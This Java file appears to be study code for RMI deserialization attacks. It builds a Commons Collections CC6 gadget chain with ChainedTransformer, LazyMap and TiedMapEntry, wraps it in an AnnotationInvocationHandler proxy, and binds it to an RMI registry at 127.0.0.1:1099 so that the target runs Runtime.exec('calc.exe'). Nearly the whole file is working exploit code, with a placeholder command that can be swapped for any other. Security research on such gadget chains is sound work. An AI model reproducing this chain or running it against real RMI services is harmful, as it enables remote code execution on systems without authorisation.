package com.lingx5.RMI;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;

public class expRegisterServer {

    public static void main(String[] args) throws Exception {
        // 创建Transform数组，构造CC6链条
        Transformer[] transforms = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
        LazyMap lazyMap = (LazyMap)LazyMap.decorate(new HashMap(),new ConstantTransformer(null));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"lingx5");
        HashMap<Object, Object> HashMap = new HashMap<>();
        HashMap.put(tiedMapEntry,"lingx5");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);
        lazyMap.remove("lingx5");

        Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(java.lang.annotation.Retention.class, HashMap);
        Remote remote = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler));
//        Registry registry = LocateRegistry.createRegistry(1099);
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry_remote.bind("exp",remote);


    }


}
